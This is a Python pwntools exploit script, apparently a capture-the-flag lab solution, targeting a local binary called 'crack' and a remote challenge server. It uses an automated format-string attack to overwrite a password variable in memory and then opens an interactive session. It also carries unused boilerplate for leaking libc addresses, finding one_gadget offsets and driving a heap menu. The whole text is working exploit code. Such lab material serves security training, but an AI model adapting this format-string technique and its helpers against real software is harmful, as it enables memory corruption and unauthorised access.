from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv
from subprocess import check_output

s = lambda data: p.send(str(data))
sa = lambda delim,data: p.sendafter(delim,str(data))
sl = lambda data: p.sendline(str(data))
sla = lambda delim,data: p.sendlineafter(delim,str(data))
r = lambda num=4096: p.recv(num)
ru = lambda delims,drop=True: p.recvuntil(delims,drop)
uu64 = lambda data: u64(data.ljust(8,'\0'))
leak = lambda name,addr: log.success('{} = {:#x}'.format(name, addr))

def leak_libc(func,addr,elf=None):
	if elf:
		libc = elf
		base = addr-libc.sym[func]
		leak('base',base)
		system = base+libc.sym['system']
	else:
		libc = LibcSearcher(func,addr)
		base = addr-libc.dump(func)
		leak('base',base)
		system = base+libc.dump('system')

	return (base,libc,system)

context.log_level = 'DEBUG'
binary = './LAB/lab7/crack'
context.binary = binary
elf = ELF(binary,checksec=False)
libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
#libc_path = './glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'
#env={'LD_PRELOAD':libc_path}
libc = ELF(libc_path,checksec=False)
one = map(int, check_output(['one_gadget','--raw',libc_path]).split(' '))
p = remote('node3.buuoj.cn',20000) if argv[1]=='r' else process(binary)

def dbg():
	gdb.attach(p)
	pause()

_add,_free,_edit,_show = 1,2,3,4
def add(size,content='a'):
	sla(':',_add)
	sla(':',size)
	sa(':',content)

def free(index):
	sla(':',_free)
	sla(':',index)

def edit(index,content):
	sla(':',_edit)
	sla(':',index)
	sa(':',content)

def show(index):
	sla(':',_show)
	sla(':',index)

# start
def exec_fmt(payload):
	io = process(binary)
	io.sendlineafter('?',payload)
	io.recvuntil('Hello ,')
	info = io.recvline()
	io.close()
	return info
auto = FmtStr(exec_fmt)

password = 0x804a048
payload = fmtstr_payload(auto.offset,{password:1234})
sla('?',payload)
sla(':',1234)
# end

p.interactive()